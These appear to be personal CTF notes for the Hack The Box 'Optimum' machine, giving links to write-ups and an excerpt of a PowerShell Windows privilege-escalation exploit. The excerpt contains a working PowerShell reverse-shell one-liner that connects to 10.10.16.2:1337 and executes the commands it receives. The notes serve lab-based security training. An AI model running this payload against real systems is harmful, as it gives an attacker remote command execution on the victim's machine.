...
{% embed url="https://rizemon.github.io/posts/optimum-htb/" %}

{% embed url="https://0xdf.gitlab.io/2021/03/17/htb-optimum.html#shell-as-system" %}

{% embed url="https://www.puckiestyle.nl/windows-privilege-escalation/" %}
FOLLOW THIS ONE
{% endembed %}

Notice the REVERSE SHELL LINE ON THE CODE
...
"@
	...
	while ($SafeGuard.ElapsedMilliseconds -lt 10000) {
		...
		$CallResult = [Advapi32]::CreateProcessWithLogonW(
			...
			'-NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"10.10.16.2\",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"',
			0x00000004, $null, $GetCurrentPath,
			[ref]$StartupInfo, [ref]$ProcessInfo)
